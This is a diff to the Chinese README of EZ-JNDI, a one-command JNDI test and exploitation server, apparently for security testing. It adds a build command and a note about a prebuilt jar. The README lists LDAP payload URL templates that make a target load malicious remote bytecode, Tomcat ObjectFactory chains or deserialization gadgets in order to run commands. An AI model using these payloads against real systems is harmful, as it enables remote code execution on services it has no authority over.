@@ -1,11 +1,11 @@
 # EZ-JNDI
-一键启动JNDI测试/利用环境。
+一键启动JNDI测试/利用环境，目录中的`ezjndi1.0.jar`是已经编译好的版本。
 
 LDAP Payload：
 ```text
 ldap://{IP}:{Port}/Foo --> 利用远程CodeBase加载恶意字节码执行命令
 ldap://{IP}:{Port}/Tom --> 使用Tomcat本地ObjectFactory执行命令
-ldap://{IP}:{Port}/RS/{gadget_name} --> 使用指定Gadget执行命令
+ldap://{IP}:{Port}/RS/{gadget_name} --> LDAP服务直接返回序列化数据，并使用指定Gadget执行命令
 
 可用Gadget：cck1 ｜ todo...
 ```
@@ -46,4 +46,8 @@ TODO:
         </compilerArguments>
     </configuration>
 </plugin>
+```
+另外，编译的时候请跳过测单元测试：
+```text
+maven clean package -Dmaven.skip.test=true
 ```
